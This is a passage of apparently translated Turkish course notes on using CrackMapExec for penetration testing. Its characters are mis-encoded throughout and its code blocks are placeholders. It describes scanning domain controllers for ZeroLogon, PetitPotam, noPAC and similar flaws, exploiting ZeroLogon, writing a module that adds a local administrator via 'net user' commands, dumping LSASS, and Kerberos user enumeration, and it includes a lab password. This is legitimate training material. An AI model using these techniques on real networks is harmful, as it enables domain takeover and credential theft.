Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

